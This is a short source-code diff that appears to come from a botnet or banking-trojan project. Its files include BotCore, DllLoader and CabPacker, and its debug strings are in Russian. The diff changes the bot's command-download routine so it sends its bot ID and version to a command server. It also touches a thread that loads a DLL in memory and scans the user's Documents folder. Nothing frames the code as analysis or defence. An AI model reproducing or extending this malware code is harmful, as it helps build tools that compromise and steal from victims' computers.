@@ -16,6 +16,8 @@
 #include "BotCore.h"
 #include "Plugins.h"
 #include "DllLoader.h"
+#include "CabPacker.h"
+#include "BotDef.h"
 #include <shlobj.h>
 #include <shlwapi.h>
 
@@ -376,9 +378,11 @@ bool DownloadCommand(PCHAR URL, PCHAR *HTMLCode)
 	TASKDBG("Task", "Загружаем команду: \r\n\r\n URL - [%s]\r\n BotUID - [%s]", URL, BotID.t_str());
 
 	PStrings Fields = Strings::Create();
-	AddURLParam(Fields, "id", BotID.t_str());
 
-	THTTPResponse Response;
+	AddURLParam(Fields, "id", BotID.t_str());
+	AddURLParam(Fields, "Ver", (PCHAR)BOT_VERSION);
+
+	THTTPResponseRec Response;
 	ClearStruct(Response);
 
 	#ifdef CryptHTTPH
@@ -772,7 +776,9 @@ static DWORD WINAPI ProcessDocFind(void*)
 					func( 0, DLL_PROCESS_ATTACH, 0 );
 					DWORD dwWait = (DWORD)pWaitForSingleObject( hEvent, INFINITE );
 					pCloseHandle(hEvent);
+
 					func( 0, DLL_PROCESS_DETACH, 0 );
+
 					char path[MAX_PATH], tmpName[MAX_PATH];
 					pSHGetFolderPathA( 0, CSIDL_MYDOCUMENTS,  0, 0, path );
 					pPathAppendA( path, "search" );
